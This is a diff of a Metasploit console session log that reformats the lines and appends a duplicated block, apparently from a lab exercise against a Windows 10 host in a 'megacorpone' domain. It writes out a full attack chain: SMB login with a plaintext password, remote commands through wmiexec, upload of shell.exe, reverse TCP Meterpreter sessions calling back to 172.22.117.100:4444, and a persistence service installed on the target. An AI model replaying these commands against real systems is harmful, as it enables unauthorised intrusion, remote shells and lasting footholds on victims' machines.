@@ -1,4 +1,16 @@
-[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\                                                  
+[*] Starting the Metasploit Framework console.../
+[*] Starting the Metasploit Framework console...-
+[*] Starting the Metasploit Framework console...\
+[*] starting the Metasploit Framework console...|
+[*] STarting the Metasploit Framework console.../
+[*] StArting the Metasploit Framework console...-
+[*] StaRting the Metasploit Framework console...\
+[*] StarTing the Metasploit Framework console...|
+[*] StartIng the Metasploit Framework console.../
+[*] StartiNg the Metasploit Framework console...-
+[*] StartinG the Metasploit Framework console...\
+
+                                                  
 [0m[36m[1m[37m
          .                                         .
  .
@@ -31,7 +43,8 @@ Metasploit tip: Save the current environment with the
 environment again
 
 [?1034h[4mmsf6[0m [0m> resource resource1.rc
-resource resource1.rc
+resource resource1.rc
+
 [0m[1m[34m[*][0m Processing /root/resource1.rc for ERB directives.
 resource (/root/resource1.rc)> use auxiliary/scanner/smb/smb_login
 smbclient //172.22.117.20/C$ -U megacorpone/tstark
@@ -59,7 +72,8 @@ resource (/root/resource1.rc)> run
 [0m
 [1m[34m[*][0m Running for 172.22.117.20...
 [1m[34m[*][0m 172.22.117.20 - SMBv3.0 dialect used
-[1m[34m[*][0m megacorpone\tstark
+[1m[34m[*][0m megacorpone\tstark
+
 
 [1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
 [1m[34m[*][0m Auxiliary module execution completed
@@ -76,56 +90,106 @@ resource (/root/resource1.rc)> set COMMAND systeminfo
 resource (/root/resource1.rc)> run
 [0m[1m[34m[*][0m Running for 172.22.117.20...
 [1m[34m[*][0m 172.22.117.20 - SMBv3.0 dialect used
-[1m[34m[*][0m 
-Host Name:                 WINDOWS10
-OS Name:                   Microsoft Windows 10 Pro N
-OS Version:                10.0.19042 N/A Build 19042
-OS Manufacturer:           Microsoft Corporation
-OS Configuration:          Member Workstation
-OS Build Type:             Multiprocessor Free
-Registered Owner:          sysadmin
-Registered Organization:   
-Product ID:                00331-60000-00000-AA609
-Original Install Date:     5/10/2021, 12:17:16 AM
-System Boot Time:          6/18/2023, 7:32:13 PM
-System Manufacturer:       Microsoft Corporation
-System Model:              Virtual Machine
-System Type:               x64-based PC
-Processor(s):              1 Processor(s) Installed.
-                           [01]: AMD64 Family 25 Model 33 Stepping 0 AuthenticAMD ~3700 Mhz
-BIOS Version:              Microsoft Corporation Hyper-V UEFI Release v4.0, 11/1/2019
-Windows Directory:         C:\Windows
-System Directory:          C:\Windows\system32
-Boot Device:               \Device\HarddiskVolume1
-System Locale:             en-us;English (United States)
-Input Locale:              en-us;English (United States)
-Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
-Total Physical Memory:     2,069 MB
-Available Physical Memory: 1,098 MB
-Virtual Memory: Max Size:  3,797 MB
-Virtual Memory: Available: 2,116 MB
-Virtual Memory: In Use:    1,681 MB
-Page File Location(s):     C:\pagefile.sys
-Domain:                    megacorpone.local
-Logon Server:              N/A
-Hotfix(s):                 7 Hotfix(s) Installed.
-                           [01]: KB5005539
-                           [02]: KB4562830
-                           [03]: KB4570334
-                           [04]: KB4580325
-                           [05]: KB4586864
-                           [06]: KB5006670
-                           [07]: KB5005699
-Network Card(s):           2 NIC(s) Installed.
-                           [01]: Microsoft Hyper-V Network Adapter
-                                 Connection Name: Ethernet
-                                 DHCP Enabled:    No
-                                 IP address(es)
-                                 [01]: 172.22.117.20
-                           [02]: Microsoft Hyper-V Network Adapter
-                                 Connection Name: Ethernet 2
-                                 Status:          Media disconnected
-Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+[1m[34m[*][0m 
+
+Host Name:                 WINDOWS10
+
+OS Name:                   Microsoft Windows 10 Pro N
+
+OS Version:                10.0.19042 N/A Build 19042
+
+OS Manufacturer:           Microsoft Corporation
+
+OS Configuration:          Member Workstation
+
+OS Build Type:             Multiprocessor Free
+
+Registered Owner:          sysadmin
+
+Registered Organization:   
+
+Product ID:                00331-60000-00000-AA609
+
+Original Install Date:     5/10/2021, 12:17:16 AM
+
+System Boot Time:          6/18/2023, 7:32:13 PM
+
+System Manufacturer:       Microsoft Corporation
+
+System Model:              Virtual Machine
+
+System Type:               x64-based PC
+
+Processor(s):              1 Processor(s) Installed.
+
+                           [01]: AMD64 Family 25 Model 33 Stepping 0 AuthenticAMD ~3700 Mhz
+
+BIOS Version:              Microsoft Corporation Hyper-V UEFI Release v4.0, 11/1/2019
+
+Windows Directory:         C:\Windows
+
+System Directory:          C:\Windows\system32
+
+Boot Device:               \Device\HarddiskVolume1
+
+System Locale:             en-us;English (United States)
+
+Input Locale:              en-us;English (United States)
+
+Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
+
+Total Physical Memory:     2,069 MB
+
+Available Physical Memory: 1,098 MB
+
+Virtual Memory: Max Size:  3,797 MB
+
+Virtual Memory: Available: 2,116 MB
+
+Virtual Memory: In Use:    1,681 MB
+
+Page File Location(s):     C:\pagefile.sys
+
+Domain:                    megacorpone.local
+
+Logon Server:              N/A
+
+Hotfix(s):                 7 Hotfix(s) Installed.
+
+                           [01]: KB5005539
+
+                           [02]: KB4562830
+
+                           [03]: KB4570334
+
+                           [04]: KB4580325
+
+                           [05]: KB4586864
+
+                           [06]: KB5006670
+
+                           [07]: KB5005699
+
+Network Card(s):           2 NIC(s) Installed.
+
+                           [01]: Microsoft Hyper-V Network Adapter
+
+                                 Connection Name: Ethernet
+
+                                 DHCP Enabled:    No
+
+                                 IP address(es)
+
+                                 [01]: 172.22.117.20
+
+                           [02]: Microsoft Hyper-V Network Adapter
+
+                                 Connection Name: Ethernet 2
+
+                                 Status:          Media disconnected
+
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+
 
 [1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
 [1m[34m[*][0m Auxiliary module execution completed
@@ -134,26 +198,46 @@ resource (/root/resource1.rc)> set COMMAND net session
 resource (/root/resource1.rc)> run
 [0m[1m[34m[*][0m Running for 172.22.117.20...
 [1m[34m[*][0m 172.22.117.20 - SMBv3.0 dialect used
-[1m[34m[*][0m 
-Computer               User name            Client Type       Opens Idle time
-
--------------------------------------------------------------------------------
-\\127.0.0.1            tstark                                     1 01D 07H 01M 
-\\127.0.0.1            tstark                                     1 01D 06H 51M 
-\\127.0.0.1            tstark                                     1 01D 06H 22M 
-\\127.0.0.1            tstark                                     1 01D 06H 09M 
-\\127.0.0.1            tstark                                     1 04:43:56    
-\\127.0.0.1            tstark                                     1 04:28:24    
-\\127.0.0.1            tstark                                     1 04:07:40    
-\\127.0.0.1            tstark                                     1 00:28:53    
-\\127.0.0.1            tstark                                     0 00:00:06    
-\\127.0.0.1            tstark                                     0 00:00:05    
-\\127.0.0.1            WINDOWS10$                                 0 00:00:02    
-\\127.0.0.1            tstark                                     0 00:00:02    
-\\127.0.0.1            tstark                                     1 00:00:01    
-\\172.22.117.100       tstark                                     0 00:00:01    
-The command completed successfully.
-
+[1m[34m[*][0m 
+
+Computer               User name            Client Type       Opens Idle time
+
+
+
+-------------------------------------------------------------------------------
+
+\\127.0.0.1            tstark                                     1 01D 07H 01M 
+
+\\127.0.0.1            tstark                                     1 01D 06H 51M 
+
+\\127.0.0.1            tstark                                     1 01D 06H 22M 
+
+\\127.0.0.1            tstark                                     1 01D 06H 09M 
+
+\\127.0.0.1            tstark                                     1 04:43:56    
+
+\\127.0.0.1            tstark                                     1 04:28:24    
+
+\\127.0.0.1            tstark                                     1 04:07:40    
+
+\\127.0.0.1            tstark                                     1 00:28:53    
+
+\\127.0.0.1            tstark                                     0 00:00:06    
+
+\\127.0.0.1            tstark                                     0 00:00:05    
+
+\\127.0.0.1            WINDOWS10$                                 0 00:00:02    
+
+\\127.0.0.1            tstark                                     0 00:00:02    
+
+\\127.0.0.1            tstark                                     1 00:00:01    
+
+\\172.22.117.100       tstark                                     0 00:00:01    
+
+The command completed successfully.
+
+
+
 
 [1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
 [1m[34m[*][0m Auxiliary module execution completed
@@ -162,19 +246,30 @@ resource (/root/resource1.rc)> set COMMAND net share
 resource (/root/resource1.rc)> run
 [0m[1m[34m[*][0m Running for 172.22.117.20...
 [1m[34m[*][0m 172.22.117.20 - SMBv3.0 dialect used
-[1m[34m[*][0m 
-Share name   Resource                        Remark
-
--------------------------------------------------------------------------------
-C$           C:\                             Default share                     
-IPC$                                         Remote IPC                        
-ADMIN$       C:\Windows                      Remote Admin                      
-The command completed successfully.
-
+[1m[34m[*][0m 
+
+Share name   Resource                        Remark
+
+
+
+-------------------------------------------------------------------------------
+
+C$           C:\                             Default share                     
+
+IPC$                                         Remote IPC                        
+
+ADMIN$       C:\Windows                      Remote Admin                      
+
+The command completed successfully.
+
+
+
 
 [1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
 [1m[34m[*][0m Auxiliary module execution completed
-[4mmsf6[0m auxiliary([1m[31mscanner/smb/impacket/wmiexec[0m) [0m> smbclient //172.22.117.20/C$ -U m egacorpone/tstark
+[4mmsf6[0m auxiliary([1m[31mscanner/smb/impacket/wmiexec[0m) [0m> smbclient //172.22.117.20/C$ -U m 
+egacorpone/tstark
+
 [0m[1m[34m[*][0m exec: smbclient //172.22.117.20/C$ -U megacorpone/tstark
 
 Enter MEGACORPONE\tstark's password: Password!
@@ -182,11 +277,14 @@ Enter MEGACORPONE\tstark's password: Password!
 Try "help" to get a list of possible commands.
 [?2004hsmb: \> put shell.exe
 put shell.exe
-[?2004lNT_STATUS_SHARING_VIOLATION opening remote file \shell.exe
+[?2004l
+NT_STATUS_SHARING_VIOLATION opening remote file \shell.exe
 [?2004hsmb: \> exit
 exit
-[?2004l[4mmsf6[0m auxiliary([1m[31mscanner/smb/impacket/wmiexec[0m) [0m> resource resource2.rc
-resource resource2.rc
+[?2004l
+[4mmsf6[0m auxiliary([1m[31mscanner/smb/impacket/wmiexec[0m) [0m> resource resource2.rc
+resource resource2.rc
+
 [0m[1m[34m[*][0m Processing /root/resource2.rc for ERB directives.
 resource (/root/resource2.rc)> use exploit/multi/handler
 [0m[1m[34m[*][0m Using configured payload generic/shell_reverse_tcp
@@ -225,10 +323,12 @@ resource (/root/resource2.rc)> sessions -i 1
 [0m[1m[34m[*][0m Starting interaction with 1...
 
 [4mmeterpreter[0m > background
-background
+background
+
 [0m[1m[34m[*][0m Backgrounding session 1...
 [4mmsf6[0m auxiliary([1m[31mscanner/smb/impacket/wmiexec[0m) [0m> resource resource3.rc
-resource resource3.rc
+resource resource3.rc
+
 [0m[1m[34m[*][0m Processing /root/resource3.rc for ERB directives.
 resource (/root/resource3.rc)> use windows/local/persistence_service
 [0m[1m[34m[*][0m No payload configured, defaulting to windows/meterpreter/reverse_tcp
@@ -244,6 +344,57 @@ resource (/root/resource3.rc)> run
 [1m[34m[*][0m Creating service jBLx
 [1m[34m[*][0m Cleanup Meterpreter RC File: /root/.msf4/logs/persistence/WINDOWS10_20230619.0056/WINDOWS10_20230619.0056.rc
 [1m[34m[*][0m Exploit completed, but no session was created.
-[4mmsf6[0m exploit([1m[31mwindows/local/persistence_service[0m) [0m> shell
+[4mmsf6[0m exploit([1m[31mwindows/local/persistence_service[0m) [0m> shell
+
 [0m[1m[31m[-][0m Unknown command: shell
 [4mmsf6[0m exploit([1m[31mwindows/local/persistence_service[0m) [0m> 
+
+
+
+ESC[1mESC[34m[*]ESC[0m Started reverse TCP handler on 172.22.117.100:4444 
+resource (/root/resource2.rc)> set RHOSTS 172.22.117.20
+ESC[0mRHOSTS => 172.22.117.20
+resource (/root/resource2.rc)> set SMBDomain megacorpone
+ESC[0mSMBDomain => megacorpone
+resource (/root/resource2.rc)> set SMBPass Password!
+ESC[0mSMBPass => Password!
+resource (/root/resource2.rc)> set SMBUser tstark
+ESC[0mSMBUser => tstark
+resource (/root/resource2.rc)> set COMMAND C:\\shell.exe
+ESC[0mCOMMAND => C:\shell.exe
+resource (/root/resource2.rc)> run
+ESC[0mESC[1mESC[34m[*]ESC[0m Running for 172.22.117.20...
+ESC[1mESC[34m[*]ESC[0m 172.22.117.20 - SMBv3.0 dialect used
+ESC[1mESC[34m[*]ESC[0m Sending stage (200262 bytes) to 172.22.117.20
+ESC[0mESC[0mESC[1mESC[34m[*]ESC[0m Sending stage (200262 bytes) to 172.22.117.20
+ESC[0mESC[1mESC[34m[*]ESC[0m Meterpreter session 1 opened (172.22.117.100:4444 -> 172.22.117.20:49931 ) at 2023-06-19 10:48:56 -0400
+ESC[0mESC[1mESC[34m[*]ESC[0m Meterpreter session 2 opened (172.22.117.100:4444 -> 172.22.117.20:50379 ) at 2023-06-19 10:48:57 -0400
+ESC[1mESC[34m[*]ESC[0m Scanned 1 of 1 hosts (100% complete)
+ESC[1mESC[34m[*]ESC[0m Auxiliary module execution completed
+resource (/root/resource2.rc)> sessions -i 1
+ESC[0mESC[1mESC[34m[*]ESC[0m Starting interaction with 1...
+
+ESC[4mmeterpreterESC[0m > background
+background
+ESC[0mESC[1mESC[34m[*]ESC[0m Backgrounding session 1...
+ESC[4mmsf6ESC[0m auxiliary(ESC[1mESC[31mscanner/smb/impacket/wmiexecESC[0m) ESC[0m> resource resource3.rc
+resource resource3.rc
+ESC[0mESC[1mESC[34m[*]ESC[0m Processing /root/resource3.rc for ERB directives.
+resource (/root/resource3.rc)> use windows/local/persistence_service
+ESC[0mESC[1mESC[34m[*]ESC[0m No payload configured, defaulting to windows/meterpreter/reverse_tcp
+shell
+resource (/root/resource3.rc)> set SESSION 1
+ESC[0mSESSION => 1
+resource (/root/resource3.rc)> run
+ESC[0mshell
+
+ESC[1mESC[34m[*]ESC[0m Started reverse TCP handler on 172.21.148.118:4444 
+ESC[1mESC[34m[*]ESC[0m Running module against WINDOWS10
+ESC[1mESC[32m[+]ESC[0m Meterpreter service exe written to C:\Users\TSTARK~1.MEG\AppData\Local\Temp\buRFwvHw.exe
+ESC[1mESC[34m[*]ESC[0m Creating service jBLx
+ESC[1mESC[34m[*]ESC[0m Cleanup Meterpreter RC File: /root/.msf4/logs/persistence/WINDOWS10_20230619.0056/WINDOWS10_20230619.0056.rc
+ESC[1mESC[34m[*]ESC[0m Exploit completed, but no session was created.
+ESC[4mmsf6ESC[0m exploit(ESC[1mESC[31mwindows/local/persistence_serviceESC[0m) ESC[0m> shell
+ESC[0mESC[1mESC[31m[-]ESC[0m Unknown command: shell
+ESC[4mmsf6ESC[0m exploit(ESC[1mESC[31mwindows/local/persistence_serviceESC[0m) ESC[0m> 
+(END)
